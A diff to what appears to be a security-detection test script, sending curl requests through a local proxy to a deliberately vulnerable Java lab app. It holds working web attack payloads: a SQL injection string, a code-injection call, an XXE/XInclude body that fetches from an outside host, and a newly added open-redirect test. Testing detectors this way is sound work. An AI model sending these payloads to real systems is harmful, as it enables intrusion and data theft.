@@ -43,6 +43,9 @@ curl -x "http://${PS}:10802" "http://${IP}:8001/codeinject?filepath=1" -H "Cooki
 # sqldet
 curl -x "http://${PS}:10802" "http://${IP}:8001/sqli/mybatis/vuln01?username=joychou%27%20or%20%271%27=%271" -H "Cookie: $COOKIE"
 
+# redirect
+curl -x "http://${PS}:10802" "http://${IP}:8001/urlRedirect/redirect?url=http://www.baidu.com" -H "Cookie: $COOKIE"
+
 # xxe no
 curl -X POST -x "http://${PS}:10802" "http://${IP}:8001/xxe/Digester/vuln" -H "Content-Type: application/xml" -H "Cookie: $COOKIE" --data '<?xml version='\''1.0'\''?>
 <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>'
